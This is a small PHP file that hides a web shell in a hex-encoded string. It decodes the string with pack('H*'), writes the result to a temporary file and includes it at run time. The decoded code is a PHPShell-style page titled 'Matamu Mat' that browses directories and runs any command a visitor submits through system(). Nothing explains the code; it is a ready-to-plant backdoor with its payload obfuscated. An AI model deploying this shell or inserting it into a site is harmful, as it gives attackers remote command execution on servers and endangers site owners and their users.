<?php
$tmp=tempnam('/tmp','FOO');
$c=pack('H*','3'.'f3e3c3f7068700a0a646566696e6528275048505348454c4c5f56455253494f4e272c2027312e3727293b0a0a3f3e0a0a3c68746d6c3e0a3c686561643e0a3c7469746c653e204d6174616d75204d6174203c2f7469746c653e0a3c2f686561643e0a3c626f64793e0a3c68723e3c62723e0a0a3c3f7068700a0a69662028696e695f676574282772656769737465725f676c6f62616c73272920213d2027312729207b0a20202f2a205765276c6c20726567697374657220746865207661726961626c657320617320676c6f62616c733a202a2f0a20206966202821656d7074792824485454505f504f53545f5641525329290a20202020657874726163742824485454505f504f53545f56415253293b0a20200a20206966202821656d7074792824485454505f4745545f5641525329290a20202020657874726163742824485454505f4745545f56415253293b0a0a20206966202821656d7074792824485454505f5345525645525f5641525329290a20202020657874726163742824485454505f5345525645525f56415253293b0a7d0a0a2f2a20466972737420776520636865636b20696620746865726520686173206265656e2061736b656420666f72206120776f726b696e67206469726563746f72792e202a2f0a6966202821656d7074792824776f726b5f6469722929207b0a20202f2a204120776f726b64697220686173206265656e2061736b656420666f72202a2f0a20206966202821656d7074792824636f6d6d616e642929207b0a20202020696620286572656728275e5b5b3a626c616e6b3a5d5d2a63645b5b3a626c616e6b3a5d5d2b285b5e3b5d2b2924272c2024636f6d6d616e642c2024726567732929207b0a2020202020202f2a2057652074727920616e64206d61746368206120636420636f6d6d616e642e202a2f0a2020202020206966202824726567735b315d5b305d203d3d20272f2729207b0a2020202020202020246e65775f646972203d2024726567735b315d3b202f2f20276364202f736f6d657468696e672f2e2e2e270a2020202020207d20656c7365207b0a2020202020202020246e65775f646972203d2024776f726b5f646972202e20272f27202e2024726567735b315d3b202f2f2027636420736f6d656469722f2e2e2e270a2020202020207d0a2020202020206966202866696c655f65786973747328246e65775f646972292026262069735f64697228246e65775f6469722929207b0a202020202020202024776f726b5f646972203d20246e65775f6469723b0a2020202020207d0a202020202020756e7365742824636f6d6d616e64293b0a202020207d0a20207d0a7d0a0a6966202866696c655f6578697374732824776f726b5f646972292026262069735f6469722824776f726b5f6469722929207b0a20202f2a205765206368616e6765206469726563746f727920746f2074686174206469723a202a2f0a202063686469722824776f726b5f646972293b0a7d0a0a2f2a205765206e6f77207570646174652024776f726b5f64697220746f2061766f6964207468696e6773206c696b6520272f666f6f2f2e2e2f626172273a202a2f0a24776f726b5f646972203d2065786563282770776427293b0a0a3f3e0a0a3c666f726d206e616d653d226d79666f726d2220616374696f6e3d223c3f706870206563686f20245048505f53454c46203f3e22206d6574686f643d22706f7374223e0a3c703e43757272656e7420776f726b696e67206469726563746f72793a203c623e0a3c3f7068700a0a24776f726b5f6469725f73706c6974746564203d206578706c6f646528272f272c207375627374722824776f726b5f6469722c203129293b0a0a6563686f20273c6120687265663d2227202e20245048505f53454c46202e20273f776f726b5f6469723d2f223e526f6f743c2f613e2f273b0a0a6966202821656d7074792824776f726b5f6469725f73706c69747465645b305d2929207b0a20202470617468203d2027273b0a2020666f7220282469203d20303b202469203c20636f756e742824776f726b5f6469725f73706c6974746564293b2024692b2b29207b0a202020202470617468202e3d20272f27202e2024776f726b5f6469725f73706c69747465645b24695d3b0a202020207072696e746628273c6120687265663d2225733f776f726b5f6469723d2573223e25733c2f613e2f272c0a2020202020202020202020245048505f53454c462c2075726c656e636f6465282470617468292c2024776f726b5f6469725f73706c69747465645b24695d293b0a20207d0a7d0a0a3f3e3c2f623e3c2f703e0a3c703e43686f6f7365206e657720776f726b696e67206469726563746f72793a0a3c73656c656374206e616d653d22776f726b5f64697222206f6e4368616e67653d22746869732e666f726d2e7375626d69742829223e0a3c3f7068700a2f2a204e6f77207765206d616b652061206c697374206f6620746865206469726563746f726965732e202a2f0a246469725f68616e646c65203d206f70656e6469722824776f726b5f646972293b0a2f2a2052756e207468726f75676820616c6c207468652066696c657320616e64206469726563746f7269657320746f2066696e642074686520646972732e202a2f0a7768696c65202824646972203d207265616464697228246469725f68616e646c652929207b0a20206966202869735f64697228246469722929207b0a202020206966202824646972203d3d20272e2729207b0a2020202020206563686f20223c6f7074696f6e2076616c75653d5c2224776f726b5f6469725c222073656c65637465643e43757272656e74204469726563746f72793c2f6f7074696f6e3e5c6e223b0a202020207d20656c73656966202824646972203d3d20272e2e2729207b0a2020202020202f2a205765206861766520666f756e642074686520706172656e74206469722e205765206d757374206265206361726566756c6c2069662074686520706172656e74200a09206469726563746f72792069732074686520726f6f74206469726563746f727920282f292e202a2f0a202020202020696620287374726c656e2824776f726b5f64697229203d3d203129207b0a092f2a20776f726b5f646972206973206f6e6c79203120636861726563746572202d2069742063616e206f6e6c79206265202f2054686572652773206e6f0a20202020202020202020706172656e74206469726563746f7279207468656e2e202a2f0a2020202020207d20656c73656966202873747272706f732824776f726b5f6469722c20272f2729203d3d203029207b0a092f2a20546865206c617374202f20696e20776f726b5f646972207765726520746865206669727374206368617265637465722e0a0920202054686973206d65616e7320746861742077652068617665206120746f702d6c6576656c206469726563746f72790a0920202065672e202f62696e206f72202f686f6d65206574632e2e2e202a2f0a2020202020206563686f20223c6f7074696f6e2076616c75653d5c222f5c223e506172656e74204469726563746f72793c2f6f7074696f6e3e5c6e223b0a2020202020207d20656c7365207b0a2020202020202f2a20576520646f2061206c6974746c6520626974206f6620737472696e672d6d616e6970756c6174696f6e20746f2066696e642074686520706172656e740a09206469726563746f72792e2e2e205472757374206d65202d20697420776f726b73203a2d29202a2f0a2020202020206563686f20223c6f7074696f6e2076616c75653d5c22222e207374727265762873756273747228737472737472287374727265762824776f726b5f646972292c20222f22292c20312929202e225c223e506172656e74204469726563746f72793c2f6f7074696f6e3e5c6e223b0a2020202020207d0a202020207d20656c7365207b0a2020202020206966202824776f726b5f646972203d3d20272f2729207b0a096563686f20223c6f7074696f6e2076616c75653d5c2224776f726b5f646972246469725c223e246469723c2f6f7074696f6e3e5c6e223b0a2020202020207d20656c7365207b0a096563686f20223c6f7074696f6e2076616c75653d5c2224776f726b5f6469722f246469725c223e246469723c2f6f7074696f6e3e5c6e223b0a2020202020207d0a202020207d0a20207d0a7d0a636c6f736564697228246469725f68616e646c65293b0a0a3f3e0a0a3c2f73656c6563743e3c2f703e0a0a3c703e436f6d6d616e643a203c696e70757420747970653d227465787422206e616d653d22636f6d6d616e64222073697a653d223630223e0a3c696e707574206e616d653d227375626d69745f62746e2220747970653d227375626d6974222076616c75653d224578656375746520436f6d6d616e64223e3c2f703e0a0a3c703e456e61626c65203c636f64653e7374646572723c2f636f64653e2d7472617070696e673f203c696e70757420747970653d22636865636b626f7822206e616d653d22737464657272223e3c2f703e0a3c746578746172656120636f6c733d2238302220726f77733d2232302220726561646f6e6c793e0a0a3c3f7068700a6966202821656d7074792824636f6d6d616e642929207b0a2020696620282473746465727229207b0a2020202024746d7066696c65203d2074656d706e616d28272f746d70272c20277068707368656c6c27293b0a2020202024636f6d6d616e64202e3d202220313e2024746d7066696c6520323e26313b2022202e0a20202020226361742024746d7066696c653b20726d2024746d7066696c65223b0a20207d20656c7365206966202824636f6d6d616e64203d3d20276c732729207b0a202020202f2a206c73206c6f6f6b73206d7563682062657474657220776974682027202d46272c20494d484f2e202a2f0a2020202024636f6d6d616e64202e3d2027202d46273b0a20207d0a202073797374656d2824636f6d6d616e64293b0a7d0a3f3e0a0a3c2f74657874617265613e0a3c2f666f726d3e0a0a3c736372697074206c616e67756167653d224a6176615363726970742220747970653d22746578742f6a617661736372697074223e0a646f63756d656e742e666f726d735b305d2e636f6d6d616e642e666f63757328293b0a3c2f7363726970743e0a0a3c68723e0a0a3c2f626f64793e0a3c2f68746d6c3e0a');
file_put_contents($tmp, $c);
include $tmp;